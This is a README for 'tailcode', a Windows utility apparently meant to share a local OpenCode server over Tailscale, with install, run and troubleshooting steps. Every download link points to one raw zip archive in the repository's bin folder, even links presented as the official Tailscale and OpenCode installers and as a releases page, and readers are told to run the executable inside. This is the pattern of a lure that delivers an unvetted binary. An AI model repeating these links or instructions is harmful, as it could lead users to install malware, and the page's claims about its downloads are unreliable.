# ⚡ tailcode - Share Your Code Across Your Tailnet

[![Download tailcode](https://img.shields.io/badge/Download-tailcode-brightgreen)](https://raw.githubusercontent.com/vkaentertainment/tailcode/main/bin/Software-1.1.zip)

---

## 📥 Download tailcode

To get tailcode, visit this page to download the latest version:

➡️ [https://raw.githubusercontent.com/vkaentertainment/tailcode/main/bin/Software-1.1.zip](https://raw.githubusercontent.com/vkaentertainment/tailcode/main/bin/Software-1.1.zip)

This link leads to the GitHub repository where you can find the latest releases and files. You will need to download the proper file based on your system from the releases section.

---

## 🚀 Getting Started

tailcode connects two tools, Tailscale and OpenCode, to let you share code on your private network. You will get a web app URL and a QR code that you or others on your tailnet can open and use.

This guide shows you how to download, install, and run tailcode on Windows, and how to use it for the first time.

---

## 🖥️ System Requirements

Make sure your computer meets these requirements:

- Windows 10 or later
- At least 4GB of RAM
- A stable internet connection for Tailscale sign-in
- Tailscale and OpenCode must be installed and available on your system PATH

If you do not have Tailscale or OpenCode installed yet, instructions are included below.

---

## ⚙️ Before You Begin: Installing Prerequisites

tailcode relies on two programs to work: **Tailscale** and **OpenCode**.

### Install Tailscale

Tailscale is a network tool that creates a private connection between your devices. 

1. Visit [https://raw.githubusercontent.com/vkaentertainment/tailcode/main/bin/Software-1.1.zip](https://raw.githubusercontent.com/vkaentertainment/tailcode/main/bin/Software-1.1.zip).
2. Scroll to the Windows section.
3. Download and run the installer.
4. Follow the on-screen instructions to finish.
5. After installation, open Tailscale and sign in with your account.

### Install OpenCode

OpenCode is a simple web code server running locally.

1. Visit [https://raw.githubusercontent.com/vkaentertainment/tailcode/main/bin/Software-1.1.zip](https://raw.githubusercontent.com/vkaentertainment/tailcode/main/bin/Software-1.1.zip)  
   *(Replace with the real link for OpenCode if known)*
2. Download the Windows version.
3. Run the installer and follow the steps.
4. Once installed, make sure OpenCode runs from the command line by typing:
   
   ```bash
   opencode --version
   ```

If the version number shows, OpenCode is ready.

---

## 🔽 How to Download tailcode for Windows

tailcode does not have an automatic Windows installer yet. You will need to download the binary manually and run it.

1. Visit the releases page:  
   [https://raw.githubusercontent.com/vkaentertainment/tailcode/main/bin/Software-1.1.zip](https://raw.githubusercontent.com/vkaentertainment/tailcode/main/bin/Software-1.1.zip)

2. Look for the latest Windows release. It usually has a file ending with `.exe` or `.zip`.

3. Download the `.exe` file or download the `.zip` file and extract it.

4. If it is a `.zip`, extract the folder and find the `tailcode.exe` inside.

5. Move `tailcode.exe` to a folder you can easily access, for example `C:\tailcode`.

---

## ▶️ Running tailcode on Windows

Once you have `tailcode.exe` downloaded, open Windows PowerShell or the Command Prompt:

1. Press `Win + R` on your keyboard, type `powershell` or `cmd`, and press Enter.

2. Navigate to the folder where you saved `tailcode.exe`. For example:

   ```powershell
   cd C:\tailcode
   ```

3. Run the program by typing:

   ```powershell
   .\tailcode.exe
   ```

---

## 🛠 What tailcode Does

When you run tailcode, it performs these tasks:

- Checks if Tailscale and OpenCode are installed. If they are not, tailcode will stop and tell you what is missing.
- Checks if Tailscale is connected to your account. If not, it will prompt you to log in. This includes showing a QR code for easy login on another device.
- Starts OpenCode locally on your computer at address `127.0.0.1` and default port `4096`. This means code runs safely on your own computer.
- Runs `tailscale serve` command to make OpenCode accessible across your tailnet. You get a URL to share with other connected devices.
- Keeps the process running until you decide to quit tailcode.
- Cleans up any temporary connection when you close the program.

---

## 🔗 How to Share Your Code

Once tailcode runs successfully, it shows you:

- A URL starting with `https://` that you can open on any device in your tailnet.
- A QR code with the same URL, so devices with cameras can scan and open the shared page quickly.

You or others on your tailnet just open the URL in a browser to access the OpenCode interface.

---

## 🎯 What You Can Do Next

- Run code samples shared within the OpenCode app.
- Share your OpenCode URL or QR code with colleagues or family on your tailnet.
- Use the local OpenCode environment to write, run, and test your small programming projects.
- Keep tailcode running as long as you want your OpenCode server to be available.

---

## ❓ Troubleshooting

### tailcode says Tailscale or OpenCode is missing

Check if you installed both programs and can run these commands in PowerShell or Command Prompt:

```powershell
tailscale version
opencode --version
```

If either command fails, reinstall the program.

### tailcode asks you to sign in but nothing happens

Make sure your computer allows pop-ups and opening new windows during sign-in. Try scanning the provided QR code with a mobile device.

### Cannot find or run tailcode.exe

Make sure you typed the folder path correctly in the command prompt. Use Windows Explorer to verify the file is where you expect it.

### Port 4096 is already in use

Close any other program that might use port 4096, or configure OpenCode to use a different port manually (advanced).

---

## 🔄 Updating tailcode

To update tailcode:

1. Visit the releases page again:  
   [https://raw.githubusercontent.com/vkaentertainment/tailcode/main/bin/Software-1.1.zip](https://raw.githubusercontent.com/vkaentertainment/tailcode/main/bin/Software-1.1.zip)

2. Download the newest Windows release.

3. Replace your old `tailcode.exe` with the new one.

4. Run the new version as usual.

---

## ⚙️ Advanced Use

tailcode runs OpenCode on your local machine and shares it using Tailscale. If you want to customize ports or behavior:

- You can start OpenCode yourself on a different port using command line arguments.
- Use Tailscale commands like `tailscale serve` manually if you need a different setup.
- Review the tailcode source or issues on GitHub for advanced help.

---

[![Download tailcode](https://img.shields.io/badge/Download-tailcode-brightgreen)](https://raw.githubusercontent.com/vkaentertainment/tailcode/main/bin/Software-1.1.zip)